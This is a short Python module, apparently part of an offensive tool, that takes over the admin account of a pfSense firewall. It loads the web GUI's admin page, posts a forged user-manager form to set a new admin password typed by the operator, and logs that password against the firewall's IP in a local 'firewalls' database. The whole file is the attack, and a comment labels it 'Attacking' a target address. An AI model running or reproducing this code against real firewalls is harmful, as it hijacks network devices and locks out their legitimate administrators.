import Utils.Database
from Utils.Web import simple_get, simple_post

from termcolor import cprint

def change_admin_password(target):
    """
    """
    # Attacking: https://192.168.189.145's admin
    cprint("Attacking: ", "yellow", end="") 
    cprint(f"{target.targetUrl}'s admin", "blue")
    # New Password: 
    cprint("New Password", "blue", end="")
    cprint(": ", "white", end="")
    password = input()

    simple_get(target, "/system_advanced_admin.php", "", 0)
    postData = {"usernamefld":"admin",
                "passwordfld1":password,
                "passwordfld2":password,
                "expires":"",
                "webguicss":"pfSense.css",
                "webguifixedmenu":"",
                "webguihostnamemenu":"",
                "dashboardcolumns":"2",
                "groups[]":"admins",
                "authorizedkeys":"",
                "ipsecpsk":"",
                "act":"",
                "userid":"0",
                "privid":"",
                "certid":"",
                "utype":"system",
                "oldusername":"admin",
                "save":"Save"
        }
    try:
        simple_post(target, "/system_usermanager.php?act=edit&userid=0", postData, 0)
        
        # This worked first time... hmphhh ¯\_(ツ)_/¯
        dbConn = Utils.Database()
        dbConn.change_row("firewalls", "password", password, "ip", target.targetIp)
    except:
        cprint("Unable to change password", "red")
                
